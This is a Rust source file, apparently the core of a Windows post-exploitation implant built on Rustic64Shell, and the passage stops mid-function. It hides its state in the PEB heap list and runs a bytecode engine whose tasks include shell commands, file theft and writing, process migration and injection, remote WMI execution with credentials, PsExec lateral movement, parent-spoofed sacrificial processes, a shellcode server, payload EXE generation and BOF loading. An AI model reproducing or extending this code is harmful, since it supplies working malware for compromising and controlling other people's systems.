// Based on https://github.com/safedv/Rustic64Shell
#![no_std]
#![no_main]
#![feature(c_variadic)]
#![allow(warnings)]

extern crate alloc;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

use core::arch::global_asm;
use alloc::borrow::ToOwned;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
#[cfg(feature = "bof")]
use bof::run_bof;
use core::ffi::c_void;
use libs::advapi::init_advapi32_funcs;
use libs::k32::init_kernel32_funcs;
#[cfg(feature = "ad")]
use libs::ldap32::init_ldap32_funcs;
use libs::ntapi::init_ntdll_funcs;
#[cfg(feature = "execution")]
use libs::ole::init_ole32_funcs;
use libs::utils::get_shellcode;
use libs::utils::get_task;
use libs::utils::write_output;
use libs::utils::int_to_str;
#[cfg(feature = "network")]
use libs::winhttp::init_winhttp_funcs;
#[cfg(feature = "network")]
use libs::winhttp::split_url;
#[cfg(all(feature = "network", feature = "payload_gen"))]
use libs::winsock::shellcode_server;
#[cfg(feature = "network")]
use libs::winsock::init_winsock_funcs;
#[cfg(feature = "payload_gen")]
mod blobs;
#[cfg(feature = "bof")]
mod bof;
#[cfg(feature = "execution")]
mod com;
#[cfg(any(feature = "enumerate", feature = "network", feature = "priv", feature = "execution"))]
mod enumerate;
#[cfg(any(feature = "execution", feature = "lateral_movement", feature = "services"))]
mod exec;
#[cfg(feature = "filesystem")]
mod fs;
#[cfg(any(feature = "execution", feature = "payload_gen"))]
mod inject;
#[cfg(feature = "ad")]
mod ldap;
mod libs;
mod mem;
#[cfg(any(feature = "ad", feature = "user"))]
mod net;
#[cfg(feature = "registry")]
mod reg;
#[cfg(feature = "execution")]
mod shell;
mod tasks;
#[cfg(feature = "priv")]
mod token;
#[cfg(feature = "execution")]
mod wmi;
#[cfg(feature = "python")]
mod python;
#[cfg(feature = "c2")]
mod c2;

use core::ptr::null_mut;
use libs::instance::Instance;
use libs::ntdef::find_peb;

// Set a custom global allocator
use crate::libs::allocator::NtVirtualAlloc;
#[cfg(feature = "execution")]
use crate::wmi::wmi_execute_command;

#[global_allocator]
static GLOBAL: NtVirtualAlloc = NtVirtualAlloc;

#[no_mangle]
pub extern "C" fn initialize() {
    unsafe {
        let peb = find_peb();
        let process_heaps = (*peb).process_heaps as *mut *mut c_void;
        let mut number_of_heaps = (*peb).number_of_heaps as usize;

        // Stack allocation of Instance
        //let mut instance = Instance::new(_start as usize); //could set magic to start address later, but for now manually specified magic dword will help us keep track of which regions are ours.
        let mut instance = Instance::new(libs::utils::get_magic());

        // Append instance address to PEB.ProcessHeaps
        let instance_ptr: *mut c_void = &mut instance as *mut _ as *mut c_void;

        // Append instance address to PEB.ProcessHeaps
        //instance.ptr = instance_ptr;

        // Increase the NumberOfHeaps
        (*peb).number_of_heaps += 1;

        // Append the instance_ptr
        *process_heaps.add(number_of_heaps) = instance_ptr;

        // Proceed to main function
        main();
    }
}

#[no_mangle]
pub extern "C" fn destroy() {
    unsafe {
        let peb = find_peb();
        let number_of_heaps = (*peb).number_of_heaps as usize;
        let process_heaps = (*peb).process_heaps as *mut *mut c_void;
        let our_magic = libs::utils::get_magic();

        // Find our entry by matching magic
        let mut our_index: Option<usize> = None;
        for i in 0..number_of_heaps {
            let heap = *process_heaps.add(i);
            if !heap.is_null() {
                let instance = &*(heap as *const Instance);
                if instance.magic == our_magic {
                    our_index = Some(i);

                    // Unhook all Frida hooks before freeing DLL memory
                    #[cfg(feature = "frida")]
                    {
                        let _ = libs::frida::unload_all_hooks();
                    }

                    // Free all tracked allocations (includes Frida DLL)
                    for alloc in &instance.allocations {
                        if !alloc.base.is_null() {
                            (instance.k32.virtual_free)(
                                alloc.base,
                                0,
                                0x8000, // MEM_RELEASE
                            );
                        }
                    }
                    break;
                }
            }
        }

        // If we found our entry, remove it by shifting later entries down
        if let Some(idx) = our_index {
            for i in idx..(number_of_heaps - 1) {
                *process_heaps.add(i) = *process_heaps.add(i + 1);
            }
            *process_heaps.add(number_of_heaps - 1) = null_mut();
            (*peb).number_of_heaps -= 1;
        }
    }
}

/// Build a success result: [opcode:u8][0x00000000][data...]
/// Reads current opcode from instance
fn result_ok(data: Vec<u8>) -> Vec<u8> {
    let opcode = unsafe { get_instance().map(|i| i.current_opcode).unwrap_or(0) };
    let mut r = Vec::with_capacity(5 + data.len());
    r.push(opcode);
    r.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    r.extend_from_slice(&data);
    r
}

/// Build an error result: [opcode:u8][error_code as u32 LE][message...]
/// Reads current opcode from instance
fn result_err(error_code: u32, message: &[u8]) -> Vec<u8> {
    let opcode = unsafe { get_instance().map(|i| i.current_opcode).unwrap_or(0) };
    let mut r = Vec::with_capacity(5 + message.len());
    r.push(opcode);
    r.extend_from_slice(&error_code.to_le_bytes());
    r.extend_from_slice(message);
    r
}

/// Parse a hex address string (e.g. "DEADBEEFDEADBEEF" or "7FFE0030") to usize
fn parse_hex_addr(bytes: &[u8]) -> Option<usize> {
    if bytes.is_empty() {
        return None;
    }
    let mut result: usize = 0;
    for &b in bytes {
        let nibble = match b {
            b'0'..=b'9' => b - b'0',
            b'a'..=b'f' => b - b'a' + 10,
            b'A'..=b'F' => b - b'A' + 10,
            _ => return None,
        };
        result = result.checked_shl(4)?;
        result |= nibble as usize;
    }
    Some(result)
}

/// Find and kill an agent by its magic number
/// Scans PEB process heaps (same way get_instance works)
pub unsafe fn kill_agent_by_magic(target_magic: u32) -> Result<(), u32> {
    let inst = get_instance().ok_or(0x80004005u32)?;

    // Don't kill ourselves
    if target_magic == inst.magic {
        return Err(0x80070057u32);
    }

    // Walk process heaps (same pattern as destroy())
    let peb = find_peb();
    let process_heaps = (*peb).process_heaps as *mut *mut c_void;
    let number_of_heaps = (*peb).number_of_heaps as usize;

    let mut target_index: Option<usize> = None;
    let mut thread_handle: *mut c_void = core::ptr::null_mut();

    for i in 0..number_of_heaps {
        let heap = *process_heaps.add(i);
        if !heap.is_null() {
            let target_inst = &*(heap as *const Instance);
            if target_inst.magic == target_magic {
                target_index = Some(i);
                thread_handle = target_inst.thread_handle;

                // Free all tracked allocations
                for alloc in &target_inst.allocations {
                    if !alloc.base.is_null() {
                        (inst.k32.virtual_free)(alloc.base, 0, 0x8000); // MEM_RELEASE
                    }
                }
                break;
            }
        }
    }

    // If found, remove from process_heaps and terminate thread
    if let Some(idx) = target_index {
        // Shift later entries down
        for i in idx..(number_of_heaps - 1) {
            *process_heaps.add(i) = *process_heaps.add(i + 1);
        }
        *process_heaps.add(number_of_heaps - 1) = core::ptr::null_mut();
        (*peb).number_of_heaps -= 1;

        // Terminate the thread
        if !thread_handle.is_null() {
            (inst.k32.terminate_thread)(thread_handle, 0);
        }

        return Ok(());
    }

    Err(0x80004005u32)
}

/// Execute a sequence of tasks from appended bytecode
///
/// Bytecode format:
/// [num_constants: u8]
/// [const_len: u32 LE][const_data: bytes]...
/// [num_entries: u8]
/// [task_id_0: u8][offset_0: u16 LE]  // offset from start of bytecode data
/// [task_id_1: u8][offset_1: u16 LE]
/// ...
/// [task set bytecodes...]
unsafe fn execute_sequence() {
    // get_shellcode_data_ptr returns pointer to [version:u8][size:u32][data...]
    // execute_from_ptr expects pointer to data section (after version+size)
    let ptr = libs::utils::get_shellcode_data_ptr() as *const u8;
    let data_ptr = ptr.add(5) as *const c_void; // Skip version (1) + size (4)
    let task_id = get_task();
    execute_from_ptr(data_ptr, task_id);
}

/// Execute bytecode from a pointer. This is the core execution engine.
/// Returns the final result (last_result from the execution).
///
/// The pointer should point to bytecode data AFTER the version+size header (byte 5).
/// Format: [constants][jump_table][task_sets]
pub unsafe fn execute_from_ptr(ptr: *const c_void, task_id: u8) -> Vec<u8> {
    use tasks::{resolve_arg, parse_task, BytecodeReader, Task, VarStore};

    let mut reader = BytecodeReader::new(ptr as *const u8);

    // Read constants section
    let num_constants = reader.read_u8();
    let mut constants: Vec<Vec<u8>> = Vec::with_capacity(num_constants as usize);
    for _ in 0..num_constants {
        let len = reader.read_u32_le() as usize;
        let data = reader.read_bytes(len);
        constants.push(data);
    }

    // Read jump table header
    let num_entries = reader.read_u8();
    let mut target_offset: Option<u16> = None;

    for _ in 0..num_entries {
        let entry_id = reader.read_u8();
        let offset = reader.read_u16_le();
        if entry_id == task_id {
            target_offset = Some(offset);
            break;
        }
    }

    // If no matching task set found, return error
    let offset = match target_offset {
        Some(o) => o,
        None => return result_err(0x80004005u32, b"task not found"),
    };

    // Create new reader at the target offset (from start of data section)
    let mut reader = BytecodeReader::new(ptr as *const u8);
    reader.skip(offset as usize);

    let mut vars = VarStore::new();
    let mut last_result: Vec<u8> = Vec::new();

    // Phase 1: Parse all tasks into a list
    let mut tasks: Vec<Task> = Vec::new();
    loop {
        let task = parse_task(&mut reader);
        if matches!(task, Task::End) {
            break;
        }
        tasks.push(task);
    }

    // Phase 2: Execute by index
    let mut idx: usize = 0;
    while idx < tasks.len() {
        let mut next_idx = idx + 1; // default: advance to next task

        // Set current opcode for result tagging
        if let Some(inst) = get_instance() {
            inst.current_opcode = tasks[idx].opcode();
        }

        match &tasks[idx] {
            // 0x00
            Task::End => break,

            // 0x01
            Task::StoreResult { var_id } => {
                vars.set(*var_id, last_result.clone());
            }

            // 0x02 - Updated handler below with task/magic support
            Task::GetShellcode { task, magic } => {
                let task_expanded = resolve_arg(task, &vars, &constants);
                let magic_expanded = resolve_arg(magic, &vars, &constants);
                let task_opt = if task_expanded.is_empty() {
                    None
                } else {
                    Some(task_expanded[0])
                };
                let magic_opt = if magic_expanded.len() >= 4 {
                    Some(u32::from_le_bytes([
                        magic_expanded[0],
                        magic_expanded[1],
                        magic_expanded[2],
                        magic_expanded[3],
                    ]))
                } else {
                    None
                };
                let sc = get_shellcode(task_opt, magic_opt);
                last_result = result_ok(sc.clone());
            }

            // 0x03
            Task::Sleep { duration_ms } => {
                (get_instance().unwrap().k32.sleep)(*duration_ms);
                last_result = result_ok(Vec::new());
            }

            // 0x04
            #[cfg(feature = "execution")]
            Task::RunCommand { command } => {
                let expanded = resolve_arg(command, &vars, &constants);
                let cmd_str = String::from_utf8_lossy(&expanded);
                let cmd_str = cmd_str.trim_end_matches('\0');

                match exec::run_command(cmd_str) {
                    Ok(output) => {
                        last_result = result_ok(output.as_bytes().to_vec());
                        #[cfg(feature = "debug")]
                        libs::utils::write_output(output.as_bytes());
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x05
            #[cfg(feature = "filesystem")]
            Task::GetCwd => match fs::get_cwd() {
                Ok(cwd) => {
                    last_result = result_ok(cwd.as_bytes().to_vec());
                    #[cfg(feature = "debug")]
                    libs::utils::write_output(cwd.as_bytes());
                }
                Err(e) => {
                    last_result = result_err(e, &[]);
                }
            },

            // 0x06
            #[cfg(feature = "filesystem")]
            Task::ReadFile { path } => {
                let expanded = resolve_arg(path, &vars, &constants);
                let path_str = String::from_utf8_lossy(&expanded);
                let path_str = path_str.trim_end_matches('\0');

                match fs::read_file(path_str) {
                    Ok(data) => {
                        last_result = result_ok(data.clone());
                        #[cfg(feature = "debug")]
                        libs::utils::write_output(&data);
                    }
                    Err(e) => {
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x07
            #[cfg(feature = "filesystem")]
            Task::WriteFile { path, content } => {
                let expanded_path = resolve_arg(path, &vars, &constants);
                let expanded_content = resolve_arg(content, &vars, &constants);
                let path_str = String::from_utf8_lossy(&expanded_path);
                let path_str = path_str.trim_end_matches('\0');

                match fs::write_file(path_str, expanded_content) {
                    Ok(_) => {
                        last_result = result_ok(Vec::new());
                    }
                    Err(e) => {
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x08
            Task::CheckError { var_id } => {
                if let Some(data) = vars.get(*var_id) {
                    if data.len() >= 5 {
                        let code = u32::from_le_bytes([data[1], data[2], data[3], data[4]]);
                        let code_str = libs::utils::int_to_str(code);
                        libs::utils::write_output(code_str.as_bytes());
                    } else {
                        libs::utils::write_output(b"var too short");
                    }
                } else {
                    libs::utils::write_output(b"var not found");
                }
            }

            // 0x09
            Task::Conditional {
                mode,
                var1,
                var2,
                true_idx,
                false_idx,
            } => {
                let condition = match mode {
                    0x00 => {
                        // Data check
                        if let Some(v2) = var2 {
                            // Two vars: compare data portions (bytes 5+)
                            match (vars.get(*var1), vars.get(*v2)) {
                                (Some(a), Some(b)) => a.get(5..) == b.get(5..),
                                _ => false,
                            }
                        } else {
                            // Single var: true if has data beyond opcode+status
                            vars.get(*var1).map(|d| d.len() > 5).unwrap_or(false)
                        }
                    }
                    0x01 => {
                        // Error check
                        if let Some(v2) = var2 {
                            // Two vars: compare status codes (bytes 1-4)
                            match (vars.get(*var1), vars.get(*v2)) {
                                (Some(a), Some(b)) => a.get(1..5) == b.get(1..5),
                                _ => false,
                            }
                        } else {
                            // Single var: true if status == 0 (success)
                            vars.get(*var1)
                                .map(|d| {
                                    d.len() >= 5 && d[1] == 0 && d[2] == 0 && d[3] == 0 && d[4] == 0
                                })
                                .unwrap_or(false)
                        }
                    }
                    _ => false,
                };

                next_idx = if condition {
                    *true_idx as usize
                } else {
                    *false_idx as usize
                };
            }

            // 0x0A
            Task::SetVar { var_id, data } => {
                // SetVar needs special handling - don't use resolve_arg
                // because we need to preserve/add status prefix
                use tasks::Arg;
                let value = match data {
                    Arg::Literal(bytes) => bytes.clone(), // Already has prefix from compiler
                    Arg::Var(src_id) => {
                        // Copy entire variable INCLUDING status prefix
                        vars.get(*src_id).cloned().unwrap_or_default()
                    }
                    Arg::Const(const_idx) => {
                        // Add opcode+status prefix [0x00][0x00000000] to constant data
                        let mut result = alloc::vec![0u8, 0, 0, 0, 0];
                        if let Some(const_data) = constants.get(*const_idx as usize) {
                            result.extend_from_slice(const_data);
                        }
                        result
                    }
                };
                vars.set(*var_id, value);
            }

            // 0x0B
            Task::PrintVar { var_id } => {
                let data = match var_id {
                    Some(id) => vars.get(*id).cloned(),
                    None => Some(last_result.clone()),
                };

                if let Some(data) = data {
                    // Result format: [opcode:u8][status:u32 LE][payload...]
                    if data.len() >= 5 {
                        let opcode = data[0];
                        let status = u32::from_le_bytes([data[1], data[2], data[3], data[4]]);
                        let payload = &data[5..];

                        let mut output: Vec<u8> = Vec::new();
                        output.extend_from_slice(b"[status=0x");
                        output.extend_from_slice(&libs::utils::get_hex_from_bytes(&status.to_be_bytes()));
                        output.extend_from_slice(b"] ");

                        // Try structured TSV formatting for known opcodes
                        if status == 0 {
                            if let Some(tsv) = mem::format_result_tsv(opcode, payload) {
                                output.extend_from_slice(&tsv);
                            }
                        }

                        // Fallback: raw text if no TSV was produced
                        if output.ends_with(b"] ") {
                            if !payload.is_empty() {
                                output.extend_from_slice(payload);
                            } else {
                                output.extend_from_slice(b"(no data)");
                            }
                        }
                        libs::utils::write_output(&output);
                    } else if !data.is_empty() {
                        libs::utils::write_output(&data);
                    } else {
                        libs::utils::write_output(b"(no data)");
                    }
                } else {
                    libs::utils::write_output(b"(var not set)");
                }
            }

            // 0x0C
            Task::Goto { target_idx } => {
                next_idx = *target_idx as usize;
            }

            // 0x0D
            #[cfg(feature = "execution")]
            Task::Migrate {
                task_id,
                search,
                magic,
            } => {
                let search_expanded = resolve_arg(search, &vars, &constants);
                let search_str = String::from_utf8_lossy(&search_expanded);
                let search_str = search_str.trim_end_matches('\0');

                // Parse magic if provided
                let magic_opt = if let Some(m) = magic {
                    let m_expanded = resolve_arg(m, &vars, &constants);
                    if m_expanded.len() >= 4 {
                        Some(u32::from_le_bytes([
                            m_expanded[0],
                            m_expanded[1],
                            m_expanded[2],
                            m_expanded[3],
                        ]))
                    } else {
                        None
                    }
                } else {
                    None
                };

                // Check if search is a numeric PID (direct PID mode)
                let found_pid: Option<u32> = if let Ok(direct_pid) = search_str.parse::<u32>() {
                    Some(direct_pid)
                } else {
                    // Search by process name/cmdline
                    let procs = enumerate::list_procs();
                    let mut pid = None;
                    for p in procs {
                        let mut proc_str = p.image.trim_end_matches('\0').to_owned();
                        if let Some(cmd) = &p.cmdline {
                            proc_str.push(' ');
                            proc_str.push_str(cmd);
                        }
                        if proc_str.contains(search_str) {
                            pid = Some(p.pid);
                            break;
                        }
                    }
                    pid
                };

                match found_pid {
                    Some(pid) => match inject::migrate(pid, *task_id, magic_opt) {
                        Ok(_) => {
                            last_result = result_ok(Vec::new());
                            #[cfg(feature = "debug")]
                            libs::utils::write_output(b"migrated");
                        }
                        Err(e) => {
                            #[cfg(feature = "debug")]
                            {
                                let msg = libs::utils::format_error(e);
                                if !msg.is_empty() {
                                    libs::utils::write_output(&msg);
                                }
                            }
                            last_result = result_err(e, &[]);
                        }
                    },
                    None => {
                        last_result = result_err(0x02, b"process not found");
                        #[cfg(feature = "debug")]
                        libs::utils::write_output(b"process not found");
                    }
                }
            }

            // 0x0E
            #[cfg(feature = "enumerate")]
            Task::ListProcs => {
                let procs = enumerate::list_procs();
                match postcard::to_allocvec(&procs) {
                    Ok(data) => last_result = result_ok(data),
                    Err(_) => last_result = result_err(0x80004005u32, b"serialize error"),
                }
            }

            // 0x0F
            Task::GetConst { const_idx } => {
                if let Some(data) = constants.get(*const_idx as usize) {
                    last_result = result_ok(data.clone());
                } else {
                    last_result = result_err(0x01, b"const not found");
                }
            }

            // 0x10
            #[cfg(feature = "execution")]
            Task::WmiExec {
                command,
                host,
                user,
                pass,
                domain,
            } => {
                use alloc::borrow::ToOwned;
                let cmd_expanded = resolve_arg(command, &vars, &constants);
                let host_expanded = resolve_arg(host, &vars, &constants);
                let user_expanded = resolve_arg(user, &vars, &constants);
                let pass_expanded = resolve_arg(pass, &vars, &constants);
                let domain_expanded = resolve_arg(domain, &vars, &constants);

                let cmd_str = String::from_utf8_lossy(&cmd_expanded);
                let cmd_str = cmd_str.trim_end_matches('\0');

                let host_opt = if host_expanded.is_empty() {
                    None
                } else {
                    Some(
                        String::from_utf8_lossy(&host_expanded)
                            .trim_end_matches('\0')
                            .to_string(),
                    )
                };
                let user_opt = if user_expanded.is_empty() {
                    None
                } else {
                    Some(
                        String::from_utf8_lossy(&user_expanded)
                            .trim_end_matches('\0')
                            .to_string(),
                    )
                };
                let pass_opt = if pass_expanded.is_empty() {
                    None
                } else {
                    Some(
                        String::from_utf8_lossy(&pass_expanded)
                            .trim_end_matches('\0')
                            .to_string(),
                    )
                };
                let domain_opt = if domain_expanded.is_empty() {
                    None
                } else {
                    Some(
                        String::from_utf8_lossy(&domain_expanded)
                            .trim_end_matches('\0')
                            .to_string(),
                    )
                };

                match wmi_execute_command(
                    cmd_str,
                    host_opt.as_deref(),
                    user_opt.as_deref(),
                    pass_opt.as_deref(),
                    domain_opt.as_deref(),
                ) {
                    Ok(pid) => {
                        let pid_str = libs::utils::int_to_str(pid);
                        last_result = result_ok(pid_str.as_bytes().to_vec());
                        #[cfg(feature = "debug")]
                        libs::utils::write_output(pid_str.as_bytes());
                    }
                    Err(hr) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(hr);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(hr, &[]);
                    }
                }
            }

            // 0x11
            #[cfg(feature = "network")]
            Task::HttpSend {
                method,
                host,
                port,
                path,
                secure,
                body,
            } => {
                use libs::winhttp::HttpClient;

                let method_expanded = resolve_arg(method, &vars, &constants);
                let host_expanded = resolve_arg(host, &vars, &constants);
                let port_expanded = resolve_arg(port, &vars, &constants);
                let path_expanded = resolve_arg(path, &vars, &constants);
                let secure_expanded = resolve_arg(secure, &vars, &constants);
                let body_expanded = resolve_arg(body, &vars, &constants);

                let method_str = String::from_utf8_lossy(&method_expanded);
                let method_str = method_str.trim_end_matches('\0');
                let host_str = String::from_utf8_lossy(&host_expanded);
                let host_str = host_str.trim_end_matches('\0');
                let path_str = String::from_utf8_lossy(&path_expanded);
                let path_str = path_str.trim_end_matches('\0');

                let port_val = if port_expanded.len() >= 2 {
                    (port_expanded[0] as u16) | ((port_expanded[1] as u16) << 8)
                } else if port_expanded.len() == 1 {
                    port_expanded[0] as u16
                } else {
                    443 // default to HTTPS port
                };

                let secure_val = !secure_expanded.is_empty() && secure_expanded[0] != 0;

                let body_opt = if body_expanded.is_empty() {
                    None
                } else {
                    Some(String::from_utf8_lossy(&body_expanded).to_string())
                };

                match HttpClient::new() {
                    Ok(client) => {
                        match client.send(
                            method_str,
                            host_str,
                            port_val,
                            path_str,
                            secure_val,
                            body_opt.as_deref(),
                        ) {
                            Ok(response) => {
                                last_result = result_ok(response.clone());
                                #[cfg(feature = "debug")]
                                libs::utils::write_output(&response);
                            }
                            Err(e) => {
                                #[cfg(feature = "debug")]
                                {
                                    let msg = libs::utils::format_error(e);
                                    if !msg.is_empty() {
                                        libs::utils::write_output(&msg);
                                    }
                                }
                                last_result = result_err(e, &[]);
                            }
                        }
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x12
            #[cfg(feature = "execution")]
            Task::Sacrificial {
                image,
                task_id,
                pipe_name,
                search,
                no_kill,
            } => {
                let image_expanded = resolve_arg(image, &vars, &constants);

                let image_str = String::from_utf8_lossy(&image_expanded);
                let image_str = image_str.trim_end_matches('\0');

                // Parse task_id: 0xFF = None (same task)
                let task_id_resolved = resolve_arg(task_id, &vars, &constants);
                let task_opt = if task_id_resolved.is_empty() || task_id_resolved[0] == 0xFF {
                    None
                } else {
                    Some(task_id_resolved[0])
                };

                // Search for PPID if search arg provided
                let ppid_opt = match search {
                    Some(s) => {
                        let search_expanded = resolve_arg(s, &vars, &constants);
                        if search_expanded.is_empty() {
                            None
                        } else {
                            let search_str = String::from_utf8_lossy(&search_expanded);
                            let search_str = search_str.trim_end_matches('\0');
                            let procs = enumerate::list_procs();

                            let mut found_pid: Option<u32> = None;
                            for p in procs {
                                let mut proc_str = p.image.trim_end_matches('\0').to_owned();
                                if let Some(cmd) = &p.cmdline {
                                    proc_str.push(' ');
                                    proc_str.push_str(cmd);
                                }
                                if proc_str.contains(search_str) {
                                    #[cfg(feature = "debug")]
                                    write_output(int_to_str(p.pid).as_bytes());
                                    found_pid = Some(p.pid);
                                    break;
                                }
                            }
                            found_pid
                        }
                    }
                    None => None,
                };

                // Parse pipe_name and no_kill
                // Handle case where no_kill (single byte 0/1) might be in pipe_name slot
                // if user provided only 3 args: [image][task_id][no_kill]
                let (pipe_opt, no_kill_flag) = {
                    // Resolve pipe_name if present
                    let pipe_resolved = match &pipe_name {
                        Some(p) => Some(resolve_arg(p, &vars, &constants)),
                        None => None,
                    };

                    // Check if pipe_name looks like a no_kill byte (single byte, 0 or 1)
                    let pipe_is_nokill = match &pipe_resolved {
                        Some(p) => {
                            p.len() == 1
                                && (p[0] == 0 || p[0] == 1)
                                && no_kill.is_none()
                                && search.is_none()
                        }
                        None => false,
                    };

                    if pipe_is_nokill {
                        // pipe_name is actually no_kill, no pipe configured
                        let nk = pipe_resolved.as_ref().unwrap()[0] != 0;
                        (None, nk)
                    } else {
                        // Normal parsing
                        let pipe = match pipe_resolved {
                            Some(p) => {
                                if p.is_empty() {
                                    None
                                } else {
                                    let pipe_str = String::from_utf8_lossy(&p);
                                    Some(pipe_str.trim_end_matches('\0').to_string())
                                }
                            }
                            None => None,
                        };

                        // Parse no_kill: any non-zero value = true
                        let nk = match no_kill {
                            Some(nk_arg) => {
                                let nk_resolved = resolve_arg(nk_arg, &vars, &constants);
                                !nk_resolved.is_empty() && nk_resolved[0] != 0
                            }
                            None => false,
                        };
                        (pipe, nk)
                    }
                };

                match exec::sacrificial(
                    image_str,
                    task_opt,
                    ppid_opt,
                    pipe_opt.as_deref(),
                    no_kill_flag,
                ) {
                    Ok(output) => {
                        if let Some(data) = output {
                            last_result = result_ok(data.clone());
                            #[cfg(feature = "debug")]
                            libs::utils::write_output(&data);
                        } else {
                            last_result = result_ok(Vec::new());
                            #[cfg(feature = "debug")]
                            libs::utils::write_output(b"sacrificial spawned");
                        }
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "filesystem")]
            Task::RedirectStdout { path } => {
                let path_expanded = resolve_arg(path, &vars, &constants);
                let path_str = String::from_utf8_lossy(&path_expanded);
                let path_str = path_str.trim_end_matches('\0');

                let handle = libs::utils::redirect_stdout(path_str);
                if handle.is_null() || handle == (-1isize as *mut core::ffi::c_void) {
                    let e = (get_instance().unwrap().k32.get_last_error)();
                    #[cfg(feature = "debug")]
                    {
                        let msg = libs::utils::format_error(e);
                        if !msg.is_empty() {
                            libs::utils::write_output(&msg);
                        }
                    }
                    last_result = result_err(e, &[]);
                } else {
                    last_result = result_ok(Vec::new());
                }
            }

            #[cfg(all(feature = "network", feature = "payload_gen"))]
            Task::ShellcodeServer { port, magic_base } => {
                let port_expanded = resolve_arg(port, &vars, &constants);
                let port_val = if port_expanded.len() >= 2 {
                    (port_expanded[0] as u16) | ((port_expanded[1] as u16) << 8)
                } else if port_expanded.len() == 1 {
                    port_expanded[0] as u16
                } else {
                    8080 // default port
                };

                // Parse magic_base if provided
                let magic_base_opt = if let Some(m) = magic_base {
                    let m_expanded = resolve_arg(m, &vars, &constants);
                    if m_expanded.len() >= 4 {
                        Some(u32::from_le_bytes([
                            m_expanded[0],
                            m_expanded[1],
                            m_expanded[2],
                            m_expanded[3],
                        ]))
                    } else {
                        None
                    }
                } else {
                    None
                };

                match shellcode_server(port_val, magic_base_opt) {
                    Ok(_) => {
                        last_result = result_ok(Vec::new());
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "network")]
            Task::ResolveHostname { hostname } => {
                let hostname_expanded = resolve_arg(hostname, &vars, &constants);
                let hostname_str = String::from_utf8_lossy(&hostname_expanded);
                let hostname_str = hostname_str.trim_end_matches('\0');

                let ip_str = libs::winsock::resolve_hostname(hostname_str);
                if ip_str.is_empty() {
                    let e = (get_instance().unwrap().k32.get_last_error)();
                    #[cfg(feature = "debug")]
                    {
                        let msg = libs::utils::format_error(e);
                        if !msg.is_empty() {
                            libs::utils::write_output(&msg);
                        }
                    }
                    last_result = result_err(e, &[]);
                } else {
                    last_result = result_ok(ip_str);
                }
            }

            #[cfg(feature = "lateral_movement")]
            Task::Psexec { target, service_name, display_name, binary_path, service_bin } => {
                let target = resolve_arg(target, &vars, &constants);
                let service_name = resolve_arg(service_name, &vars, &constants);
                let display_name = resolve_arg(display_name, &vars, &constants);
                let binary_path = resolve_arg(binary_path, &vars, &constants);
                let service_bin = resolve_arg(service_bin, &vars, &constants);

                let target_str = String::from_utf8_lossy(&target);
                let service_name_str = String::from_utf8_lossy(&service_name);
                let display_name_str = String::from_utf8_lossy(&display_name);
                let binary_path_str = String::from_utf8_lossy(&binary_path);

                match exec::psexec(&target_str, &service_name_str, &display_name_str, &binary_path_str, service_bin) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "payload_gen")]
            Task::GenerateExe { task_id } => {
                let task_id_expanded = resolve_arg(task_id, &vars, &constants);
                let tid = if task_id_expanded.is_empty() {
                    0
                } else {
                    task_id_expanded[0]
                };
                let shellcode = get_shellcode(Some(tid), None);
                let exe = libs::utils::generate_exe(&shellcode);
                last_result = result_ok(exe);
            }

            #[cfg(feature = "bof")]
            Task::RunBof {
                bof_data,
                entry,
                inputs,
            } => {
                let bof_data_raw = resolve_arg(bof_data, &vars, &constants);
                let entry = resolve_arg(entry, &vars, &constants);
                let inputs = resolve_arg(inputs, &vars, &constants);
                let entry_str = core::str::from_utf8(&entry).unwrap_or("go");
                let inputs_str = core::str::from_utf8(&inputs).unwrap_or("");

                // Try to decode as base64, fall back to raw bytes
                let bof_bytes = if let Ok(bof_str) = core::str::from_utf8(&bof_data_raw) {
                    libs::utils::decode_base64(bof_str).unwrap_or(bof_data_raw)
                } else {
                    bof_data_raw
                };

                let output = run_bof(&bof_bytes[..], entry_str, inputs_str);
                last_result = result_ok(output.into_bytes());
            }

            #[cfg(feature = "ad")]
            Task::QueryLdap {
                base,
                filter,
                scope,
                attribute,
            } => {
                let base = resolve_arg(base, &vars, &constants);
                let filter = resolve_arg(filter, &vars, &constants);
                let scope_bytes = resolve_arg(scope, &vars, &constants);
                let attribute = resolve_arg(attribute, &vars, &constants);

                let base_str = core::str::from_utf8(&base).unwrap_or("");
                let filter_str = core::str::from_utf8(&filter).unwrap_or("");
                let scope_val = if scope_bytes.is_empty() { 2 } else { scope_bytes[0] as u32 };
                let attr_str = core::str::from_utf8(&attribute).unwrap_or("");

                // Use current domain (empty server), no explicit creds
                let attrs = if attr_str.is_empty() {
                    None
                } else {
                    Some(alloc::vec![attr_str])
                };

                match ldap::query_ldap("", "", base_str, filter_str, scope_val, attrs, None, None, None) {
                    Ok(entries) => {
                        // Format entries as string
                        let mut output = alloc::string::String::new();
                        for entry_attrs in entries {
                            for attr in &entry_attrs {
